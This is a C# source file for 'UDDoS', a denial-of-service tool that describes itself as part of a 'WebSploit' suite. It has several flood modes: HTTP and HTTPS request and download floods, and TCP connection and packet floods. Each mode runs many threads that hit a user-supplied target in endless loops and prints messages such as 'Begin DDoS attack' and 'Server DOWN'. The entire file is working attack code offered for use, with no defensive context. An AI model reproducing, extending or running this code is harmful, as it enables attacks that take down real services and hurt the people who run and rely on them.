using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.IO;
using System.Net.Sockets;
using System.Net;
using System.Net.Http;

namespace UDDoS
{
    class DDoS
    {
        public static int counter = 0;

        //http------------------------------------------------
        public static void ProtocolHTTPBoth(string ip, int threads) //-b
        {
            SetupAttackEnv(ip);
            Thread[] ths = new Thread[threads];
            for(int i = 0; i < ths.Length; i++)
            {
                ths[i] = new Thread(() => {
                    while (true)
                    {
                        try
                        {
                            HttpClient httpClient = new HttpClient();
                            httpClient.GetStringAsync(ip).Wait(1000);
                            httpClient.GetStreamAsync(ip).Wait(1000);
                            httpClient.Dispose();
                            WebClient client = new WebClient();
                            client.DownloadStringAsync(new Uri(ip));
                            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(GETPreparedUrl(ip));
                            var res = (HttpWebResponse)req.GetResponse();
                            counter++;
                            Console.WriteLine($"http/both> Partial DOWN/GET req [req.res = {res.StatusCode}] DoS on " + ip + " || Req no > " + counter.ToString());
                        }
                        catch
                        {
                            counter++;
                            Console.WriteLine("Server {0} not responding => Server DOWN [req no = "+counter+"]", ip);
                            //break;
                        }
                        
                    }
                });
                ths[i].Start();
            }
        }
        public static void ProtocolHTTPDownload(string ip, int threads) //-d
        {
            SetupAttackEnv(ip);
            Thread[] ths = new Thread[threads];
            for(int i = 0; i < ths.Length; i++)
            {
                ths[i] = new Thread(() => {
                    while (true)
                    {
                        try
                        {
                            HttpClient httpClient = new HttpClient();
                            httpClient.GetStringAsync(ip).Wait(1000);
                            httpClient.GetStreamAsync(ip).Wait(1000);
                            httpClient.Dispose();
                            WebClient client = new WebClient();
                            client.DownloadStringAsync(new Uri(ip));
                            counter++;
                            Console.WriteLine($"http/download> Partial DOWNLOAD req DDoS on " + ip + " || Req no > " + counter.ToString());
                        }
                        catch
                        {
                            counter++;
                            Console.WriteLine("Server {0} not responding => Server DOWN [req no = "+counter+"]", ip);
                            //break;
                        }
                        
                    }
                });
                ths[i].Start();
            }
        }

        public static void ProtocolHTTPReqGET(string ip, int threads) //-g
        {
            SetupAttackEnv(ip);
            Thread[] ths = new Thread[threads];
            for(int i = 0; i < ths.Length; i++)
            {
                ths[i] = new Thread(() => {
                    while (true)
                    {
                        try
                        {
                            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(GETPreparedUrl(ip));
                            var res = (HttpWebResponse)req.GetResponse();
                            counter++;
                            Console.WriteLine($"http/get> Partial GET req [req.res = {res.StatusCode}] DoS on " + ip + " || Req no > " + counter.ToString());
                        }
                        catch
                        {
                            counter++;
                            Console.WriteLine("Server {0} not responding => Server DOWN [req no = "+counter+"]", ip);
                            //break;
                        }
                        
                    }
                });
                ths[i].Start();
            }
        }

        //httpS------------------------------------------------
        public static void ProtocolHTTPSBoth(string ip, int threads) //-b
        {
            SetupAttackEnv(ip);
            Thread[] ths = new Thread[threads];
            for(int i = 0; i < ths.Length; i++)
            {
                ths[i] = new Thread(() => {
                    while (true)
                    {
                        try
                        {
                            WebClient client = new WebClient();
                            client.DownloadStringAsync(new Uri(ip));
                            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(GETPreparedUrl(ip));
                            HttpWebResponse res = (HttpWebResponse)req.GetResponse();  
                            counter++;
                            Console.WriteLine($"https/both> Partial DOWN/GET req [req.res = {res.StatusCode}] DDoS on " + ip + " || Req no > " + counter.ToString());
                        }
                        catch
                        {
                            counter++;
                            Console.WriteLine("Server {0} not responding => Server DOWN [req no = "+counter+"]", ip);
                            //break;
                        }
                    }
                });
                ths[i].Start();
            }
        }

        public static void ProtocolHTTPSReqGET(string ip, int threads) //-g
        {
            SetupAttackEnv(ip);
            Thread[] ths = new Thread[threads];
            for(int i = 0; i < ths.Length; i++)
            {
                ths[i] = new Thread(() => {
                    while (true)
                    {
                        try
                        {
                            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(GETPreparedUrl(ip));
                            var res = (HttpWebResponse)req.GetResponse();
                            counter++;
                            Console.WriteLine($"https/get> Partial GET req [req.res = {res.StatusCode}] DoS on " + ip + " || Req no > " + counter.ToString());
                        }
                        catch
                        {
                            counter++;
                            Console.WriteLine("Server {0} not responding => Server DOWN [req no = "+counter+"]", ip);
                            //break;
                        }
                    }
                });
                ths[i].Start();
            }
        }

        public static void ProtocolHTTPSDownload(string ip, int threads) //-d
        {
            SetupAttackEnv(ip);
            Thread[] ths = new Thread[threads];
            for(int i = 0; i < ths.Length; i++)
            {
                ths[i] = new Thread(() => {
                    while (true)
                    {
                        try
                        {
                            WebClient client = new WebClient();
                            client.DownloadStringAsync(new Uri(ip));
                            counter++;
                            Console.WriteLine($"https/download> Partial DOWNLOAD req DoS on " + ip + " || Req no > " + counter.ToString());
                        }
                        catch
                        {
                            counter++;
                            Console.WriteLine("Server {0} not responding => Server DOWN [req no = "+counter+"]", ip);
                            //break;
                        }
                    }
                });
                ths[i].Start();
            }
        }

        //TCP---------------------------------------
        public static void ProtocolTCPHEAVY(string ip, int port, int threads) //-h
        {
            SetupAttackEnv(ip);
            Thread[] ths = new Thread[threads];
            for(int i = 0; i < ths.Length; i++)
            {
                ths[i] = new Thread(() => {
                    IPAddress ipA = IPAddress.Parse(ip);
                    IPEndPoint exit = new IPEndPoint(ipA, port);
                    while (true)
                    {
                        Random seed = new Random();
                        int timeout = seed.Next(1000, 10000);
                        Socket sender = new Socket(ipA.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                        try
                        {
                            sender.ConnectAsync(exit).Wait(timeout);
                            sender.Send(message.data);
                            sender.Close();
                            Console.WriteLine("tcp/heavy> Sending packet to > " + ip + " Port > " + port);
                        }
                        catch (SocketException)
                        {
                            Console.WriteLine($"[+] Server not responding on {port}. ");
                        }
                    }
                });
                ths[i].Start();
            }
        }

        public static void ProtocolTCPEZ(string ip, int port, int threads) // -e
        {
            SetupAttackEnv(ip);
            Thread[] ths = new Thread[threads];
            for(int i = 0; i < ths.Length; i++)
            {
                ths[i] = new Thread(() => {
                    for (int p = 0; p < 10000000; p++)
                    {
                        Random seed = new Random();
                        int timeout = seed.Next(1000, 3000);
                        TcpClient tcp = new TcpClient();
                        try
                        {
                            tcp.ConnectAsync(ip, port).Wait(timeout);
                            if (tcp.Connected)
                            {
                                Console.WriteLine("tcp/easy> DDOS attack {0}", ip);
                                tcp.Close();
                            }
                            else
                                Console.WriteLine($"Server {ip} not responding on {port}");
                            tcp.Close();
                        }
                        catch (Exception)
                        {
                            Console.WriteLine($"Server {ip} not responding on {port}");
                            tcp.Close();
                        }
                    }
                });
                ths[i].Start();
            }
        }

        public static void HTTPGETReq(string url)
        {
            HttpClient client = new HttpClient();
            var response = client.GetStringAsync(url).Wait(100);
        }

        public static string GETPreparedUrl(string oldurl)
        {
            string new_url = oldurl + message.values;
            return new_url;
        }

        static void SetupAttackEnv(string ip)
        {
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine(Figgle.FiggleFonts.Standard.Render("UDDoS"));
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("UDDoS v1.4 © 2021 MishDotCom");
            Console.WriteLine("Part of the WebSploit suite.");
            Console.WriteLine("WebSploit > https://github.com/MishDotCom/WebSploit\n");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"Target : {ip}");
            Console.WriteLine("[INFO] : Begin DDoS attack...\n");
            Console.ForegroundColor = ConsoleColor.White;
            Thread.Sleep(150);
        }
    }
}